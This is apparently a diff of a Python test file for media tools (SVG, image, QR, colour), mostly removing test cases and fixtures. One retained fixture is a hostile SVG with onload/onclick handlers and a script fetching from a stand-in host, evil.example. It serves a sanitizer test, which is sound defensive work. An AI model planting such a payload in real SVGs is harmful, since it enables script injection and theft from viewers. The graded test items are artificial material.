@@ -1,7 +1,6 @@
-"""media group: svg-optimize, image-crop, image-compare, lottie-inspector, image-resize, qr, color."""
+"""media group: svg-optimize, image-crop, image-compare, image-resize, qr, color."""
 import colorsys
 import io
-import json
 import re
 
 from tests.coverage.core import Case, Ctx, first_error, has, matches, used
@@ -63,13 +62,10 @@ _PNG = make_png(160, 120)  # small + solid: long runs of identical base64 are wh
 _TRIM = _img((90, 70), lambda x, y: (10, 150, 40, 255) if 13 <= x < 51 and 9 <= y < 34 else (0, 0, 0, 0))
 
 # ---- image-crop:sheet: five tiny images of different sizes
-_SHEET = {f"tile{i}.png": make_png(w, h, col) for i, (w, h, col) in enumerate(
-    [(30, 20, (200, 0, 0)), (20, 40, (0, 160, 0)), (24, 24, (0, 0, 200)), (50, 10, (200, 200, 0)), (16, 16, (120, 0, 120))], 1)}
 
 # ---- image-compare:compare: 20x10, 3 left columns differ strongly -> 15 % changed
 _CA = _img((20, 10), lambda x, y: (200, 100, 50, 255), mode="RGBA")
 _CB = _img((20, 10), lambda x, y: (20, 30, 200, 255) if x < 3 else (200, 100, 50, 255), mode="RGBA")
-_CHANGED = 3 * 10 / (20 * 10) * 100  # 15.00
 
 # ---- image-compare:alpha: 16x8 = 128 px -> 24 transparent, 40 partial, 64 opaque
 _ALPHA = _img((16, 8), lambda x, y: (255, 0, 0, 0) if y < 2 and x < 12 else ((0, 128, 255, 100) if y in (2, 3) else (10, 20, 30, 255)))
@@ -102,8 +98,6 @@ def _exif_jpg():
 
 _JPG = _exif_jpg()
 _ICON = _pal_png((300, 300), lambda x, y: (30, 120, 200))
-_TINY = _img((3, 2), lambda x, y: [(255, 0, 0), (0, 255, 0), (0, 0, 255)][x] , mode="RGB")
-_TINY_B64 = b64(_TINY)
 
 # ---- svg
 _OPT_SVG = ('<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" '
@@ -113,27 +107,9 @@ _OPT_SVG = ('<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.
 _SAN_SVG = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" onload="steal()">'
             '<script>fetch("http://evil.example/x")</script>'
             '<rect id="keep-me" x="4" y="4" width="32" height="32" fill="#12ab34" onclick="steal()"/></svg>')
-_VB_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="150px" height="72.5px"><rect width="150" height="72.5" fill="teal"/></svg>'
-_SPR_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M7 3l8 7-8 7" fill="none" stroke="#333" stroke-width="2"/></svg>'
 
-_PATHS = {
-    "wave-9": "M0 0 C1 1 2 2 3 3 C4 4 5 5 6 6 c1 1 2 2 3 3 S9 9 9 9",
-    "box-2": "M1 1 H9 V9 H1 Z M3 3 h4 v4 h-4 z",
-    "dot-4": "M5 5 m1 0 a1 1 0 1 0 -2 0",
-    "zig-1": "M0 0 L1 1 L2 0 L3 1 M10 10 l1 1",
-    "arc-3": "M2 2 Q3 3 4 2 T6 2 C7 3 8 3 9 2",
-}
-_PATH_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 12">' + "".join(f'<path id="{k}" d="{v}"/>' for k, v in _PATHS.items()) + "</svg>"
-_P_MOVES = sum(len(re.findall(r"[Mm]", d)) for d in _PATHS.values())
-_P_MOST_C = max(_PATHS, key=lambda k: len(re.findall(r"[Cc]", _PATHS[k])))
-_P_C_TOTAL = sum(len(re.findall(r"[Cc]", d)) for d in _PATHS.values())
 
 # ---- lottie
-_LOTTIE = {"v": "5.9.0", "fr": 24, "ip": 10, "op": 154, "w": 375, "h": 812,
-           "layers": [{"ty": 4, "nm": "a"}, {"ty": 4, "nm": "b"}, {"ty": 2, "nm": "c", "refId": "i0"}, {"ty": 0, "nm": "d"}, {"ty": 3, "nm": "e"}],
-           "assets": [{"id": "i0", "u": "assets/", "p": "hero_77.png", "e": 0},
-                      {"id": "i1", "p": "data:image/png;base64,iVBORw0KGgo=", "e": 1}]}
-_L_DUR = (154 - 10) / 24  # 6.0
 
 # ---- color
 _HEX = "#3a7bd5"
@@ -191,30 +167,14 @@ CASES = [
                                None if re.search(r"38\s*[x×]\s*25", c.answer) else "answer lacks the trimmed size 38x25"),
          note="expected: 90x70 -> 38x25"),
 
-    Case("image-crop", "sheet",
-         "Make one contact sheet (a grid of thumbnails with the file names under them) out of these five small PNG pictures, and tell me how many thumbnails ended up in it.\n\n"
-         + "\n\n".join(f"{n}:\n{b64(d)}" for n, d in _SHEET.items()),
-         lambda c: first_error(_attached(c), matches(c.page_only(), r"Built 5 thumbnails"), None if re.search(r"\b(five|5)\b", c.answer, re.I) else "answer lacks 5"),
-         note="page status 'Built 5 thumbnails.'", timeout_ms=300000),
 
-    Case("image-compare", "compare",
+    Case("image-compare", None,
          "I have two screenshots of the same 20x10 area, before.png and after.png (base64 below). What percentage of pixels changed noticeably "
          "(treat a per-pixel average channel difference of up to 12 out of 255 as unchanged)? Give me the percentage with two decimals.\n\nbefore.png:\n"
          + b64(_CA) + "\n\nafter.png:\n" + b64(_CB),
          lambda c: first_error(_attached(c), matches(c.haystack(), r"(?<![\d.])15(\.0+)?\s*%"), None if re.search(r"(?<![\d.])15(\.0+)?\s*%", c.answer) else "answer lacks 15%"),
          note="3 of 20 columns differ -> 15.00%"),
 
-    Case("image-compare", "alpha",
-         "How much of this PNG (sprite.png, base64 below) is fully transparent, partially transparent (semi-see-through) and fully opaque? Give me the pixel counts for each of the three.\n\n" + b64(_ALPHA),
-         lambda c: first_error(_attached(c), *[None if _word(c.answer, n) else f"answer lacks {n}" for n in (_AT, _AP, _AO)]),
-         note=f"expected transparent/partial/opaque = {_AT}/{_AP}/{_AO}"),
-
-    Case("lottie-inspector", None,
-         "Here is a Lottie animation JSON. How long does it play in seconds, how many layers does it have, and which external (not embedded) image files does it reference? "
-         "Leave the inspection of it open on screen so I can look at it too.\n\n" + json.dumps(_LOTTIE),
-         lambda c: first_error(matches(c.page_only(), r"\b6(?:\.0+)?\s*s\b"), matches(c.answer, r"\b6(\.0+)?\s*(s|sec)"), has(c.answer, "hero_77.png"),
-                               None if _word(c.answer, 5) else "answer lacks 5 layers"),
-         note="(154-10)/24 = 6 s, 5 layers, assets/hero_77.png"),
 
     Case("image-resize", "resize",
          f"Resize this image (banner.png, base64 below) to exactly {_RW} pixels wide while keeping its proportions. What are the new width and height?\n\n" + b64(_WIDE),
@@ -239,10 +199,6 @@ CASES = [
                                None if all(_word(c.answer, s) for s in (16, 32, 48, 180, 512)) else "answer lacks sizes"),
          note="16/32/48/180/512"),
 
-    Case("image-resize", "data-uri",
-         "Embed this tiny image (dot.png, base64 below) inline in an HTML <img> tag, without a separate file, and show me the final tag.\n\n" + _TINY_B64,
-         lambda c: first_error(_attached(c), None if _TINY_B64 in c.page_only() else "page lacks the real base64", None if "<img" in c.page_only() else "no <img> output on the page",
-                               None if _TINY_B64 in c.answer else "answer lacks the real base64")),
 
     Case("svg-optimize", "optimize",
          "Minify this SVG for production: drop the comments, the metadata block, editor-specific attributes and extra whitespace but keep it rendering the same, and show me the result.\n\n" + _OPT_SVG,
@@ -258,19 +214,6 @@ CASES = [
              *["dangerous construct kept: " + b for b in ("<script", "onload", "onclick", "evil.example") if b in o][:1],
              has(o, "keep-me", "12ab34")))(_readonly(c))),
 
-    Case("svg-optimize", "viewbox",
-         "This SVG has width and height but no viewBox, so it doesn't scale. Add the right viewBox and show me the fixed SVG.\n\n" + _VB_SVG,
-         lambda c: first_error(matches(_readonly(c), r'viewBox="0 0 150 72\.5"'), matches(c.answer, r"0 0 150 72\.5"))),
-
-    Case("svg-optimize", "paths",
-         "Analyse the path data in this SVG: how many path elements are there, how many sub-paths (move-to commands, upper or lower case) in total, "
-         "and which path id has the most cubic Bezier (C/c) commands? Leave the analysis open on screen so I can look at it too.\n\n" + _PATH_SVG,
-         lambda c: first_error(None if _word(c.answer, len(_PATHS)) else f"answer lacks {len(_PATHS)} paths", None if _word(c.answer, _P_MOVES) else f"answer lacks {_P_MOVES} subpaths",
-                               has(c.answer, _P_MOST_C), has(c.page_only(), "Path elements", ci=True))),
-
-    Case("svg-optimize", "sprite",
-         "Turn this icon into a symbol for an SVG sprite sheet with the id chevron-right, and show me the sprite markup and how to reference it.\n\n" + _SPR_SVG,
-         lambda c: first_error(matches(_readonly(c), r'<symbol id="chevron-right" viewBox="0 0 20 20">'), matches(_readonly(c), r"icons\.svg#chevron-right"))),
 
     Case("svg-optimize", "png",
          "Render this SVG to a PNG that is exactly 333 pixels wide and 148 pixels tall, and tell me the exported size.\n\n"
